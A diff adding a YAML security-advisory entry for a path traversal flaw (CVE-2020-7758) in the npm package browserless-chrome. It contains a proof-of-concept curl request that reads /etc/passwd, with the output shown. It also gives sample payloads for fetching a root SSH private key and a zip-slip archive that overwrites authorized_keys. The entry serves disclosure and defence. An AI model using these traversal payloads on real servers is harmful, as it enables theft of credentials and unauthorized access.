@@ -1,0 +1,60 @@
+---
+- id: snykio:npm:browserless-chrome:1023657
+  title: Path Traversal
+  description: "[browserless-chrome][1] is a web-service that allows for remote clients\nto
+    connect, drive, and execute headless work; all inside of docker. It\noffers first-class
+    integrations for puppeteer, playwright, selenium\\'s\nwebdriver, and a slew of
+    handy REST APIs for doing more common work.\n\nAffected versions of this package
+    are vulnerable to Path Traversal. User\ninput flowing from the workspace endpoint
+    gets used to create a file\npath `filePath` and this is fetched and then sent
+    back to a user. This\ncan be escaped to fetch arbitrary files from a server.\n\n###
+    PoC   {#poc}\n\n    run docker run -p 3000:3000 browserless/chrome\n    \n    snoopy@snoopy-XPS-15-9570:~$
+    curl --path-as-is --url 'http://localhost:3000/workspace/../../../../../../../../../../../../../../../../etc/passwd'\n
+    \   root:x:0:0:root:/root:/bin/bash\n    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n
+    \   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n    sys:x:3:3:sys:/dev:/usr/sbin/nologin\n
+    \   sync:x:4:65534:sync:/bin:/bin/sync\n    games:x:5:60:games:/usr/games:/usr/sbin/nologin\n
+    \   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n\n\n\n[1]:
+    https://www.npmjs.com/package/browserless-chrome\n\\nA Directory Traversal attack
+    (also known as path traversal) aims to\naccess files and directories that are
+    stored outside the intended\nfolder. By manipulating files with \\\"dot-dot-slash
+    (../)\\\" sequences and\nits variations, or by using absolute file paths, it may
+    be possible to\naccess arbitrary files and directories stored on file system,
+    including\napplication source code, configuration, and other critical system files.\n\nDirectory
+    Traversal vulnerabilities can be generally divided into two\ntypes:\n\n* **Information
+    Disclosure**\\: Allows the attacker to gain information\n  about the folder structure
+    or read the contents of sensitive files on\n  the system.\n\n`st` is a module
+    for serving static files on web pages, and contains a\n[vulnerability of this
+    type][1]. In our example, we will serve files\nfrom the `public` route.\n\nIf
+    an attacker requests the following URL from our server, it will in\nturn leak
+    the sensitive private key of the root user.\n\n    curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n\n**Note**
+    `%2e` is the URL encoded version of `.` (dot).\n\n* **Writing arbitrary files**\\:
+    Allows the attacker to create or replace\n  existing files. This type of vulnerability
+    is also known as\n  `Zip-Slip`.\n\nOne way to achieve this is by using a malicious
+    `zip` archive that holds\npath traversal filenames. When each filename in the
+    zip archive gets\nconcatenated to the target extraction folder, without validation,
+    the\nfinal path ends up outside of the target folder. If an executable or a\nconfiguration
+    file is overwritten with a file containing malicious code,\nthe problem can turn
+    into an arbitrary code execution issue quite\neasily.\n\nThe following is an example
+    of a `zip` archive with one benign file and\none malicious file. Extracting the
+    malicious file will result in\ntraversing out of the target folder, ending up
+    in `/root/.ssh/`\noverwriting the `authorized_keys` file:\n\n    2018-04-15 22:04:29
+    .....           19           19  good.txt\n    2018-04-15 22:04:42 .....           20
+    \          20  ../../../../../../root/.ssh/authorized_keys\n\n\n\n[1]: https://snyk.io/vuln/npm:st:20140206\n"
+  affected_package: browserless-chrome
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-7758
+  cwe:
+  - CWE-22
+  disclosed_date: 2020-10-29
+  created_date: 2020-10-29
+  last_modified_date: 2020-10-29
+  credit:
+  - Snyk Security Team
+  references:
+  - https://github.com/browserless/chrome/blob/master/src/routes.ts#L175
+  - https://github.com/browserless/chrome/commit/848b87e5bea4f8473eea85261a5ff922d6ebd2b6
+  source_url: https://snyk.io/vuln/SNYK-JS-BROWSERLESSCHROME-1023657
